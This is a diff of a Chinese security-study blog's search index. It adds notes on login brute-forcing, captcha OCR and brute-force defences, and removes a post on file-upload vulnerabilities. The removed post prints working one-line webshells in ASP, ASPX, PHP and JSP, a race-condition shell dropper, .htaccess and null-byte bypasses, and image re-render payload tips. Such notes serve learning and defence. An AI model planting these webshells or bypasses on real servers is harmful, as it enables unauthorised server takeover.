+<h3 id="数据包传输类型"><a href="#数据包传输类型" class="headerlink" title="数据包传输类型"></a>数据包传输类型</h3><ul>
+<li>application….from urlLencode</li>
+<li>payload打开密码字典以换行为分割</li>
+<li>批量请求，寻找flag</li>
+</ul>
+<h3 id="简单的token验证"><a href="#简单的token验证" class="headerlink" title="简单的token验证"></a>简单的token验证</h3><ul>
+<li>token时间戳验证</li>
+</ul>
+<h3 id="识别验证码爆破"><a href="#识别验证码爆破" class="headerlink" title="识别验证码爆破"></a>识别验证码爆破</h3><p><img src="/posts/29527/4.png"></p>
+<ul>
+<li>工具：PKAV HTTP Fuzzer</li>
+<li>验证码识别重放模式为单线程</li>
+<li>这次比之前增加了验证码验证模块，码源提示ocr，容易想到利用burp的插件来进行验证码识别爆破。<br>这里用的是captcha-killer插件，开源地址：<a href="http://github.com/c0ny1/captcha-killer">http://github.com/c0ny1/captcha-killer</a><br>先利用burp抓取生成验证码页面，发送到插件的验证码识别模块。</li>
+</ul>
+<h2 id="防止爆破的方法"><a href="#防止爆破的方法" class="headerlink" title="防止爆破的方法"></a>防止爆破的方法</h2><ul>
+<li>多因素认证，爆破次数太多会锁定，但漏洞会导致管理也无法登录。</li>
+<li>sso————统一登陆认证</li>
+<li>加密</li>
+<li>token</li>
+<li>验证码</li>
 </ul>
 ]]></content>
   </entry>
@@ -271,40 +308,8 @@
 ]]></content>
   </entry>
   <entry>
-    <title>网络安全学习之文件上传</title>
-    <url>/posts/2682.html</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
-<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
-<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
-<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
-<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
-<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
-</ul>
-<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
-<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
-<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
-<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
-<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
-</ul>
-<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
-<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><ul>
-<li>原理：上传文件后，网站会对图片进行二次处理(格式、尺寸、要求等)，服务器会把里面的内容进行替换和更新。处理完成后，根据原有的图片生成一个新的图片并放到网站对应的标签进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure></li>
-<li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li>
-<li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT 数据块</li>
-<li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试渲染两次会返回正确木马</li>
-<li>JPG坑点总结<br>需要被imagecreatefromjpeg渲染或再用工具<br>图片找的稍微大一点成功率更高<br>Payload语句越短成功率越高<br>一张图片不行就换一张不要死磕  </li>
-<li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
+    <title>网络安全学习之文件下载</title>
+    <url>/posts/2596935637.html</url>
+    <content><![CDATA[]]></content>
   </entry>
 </search>
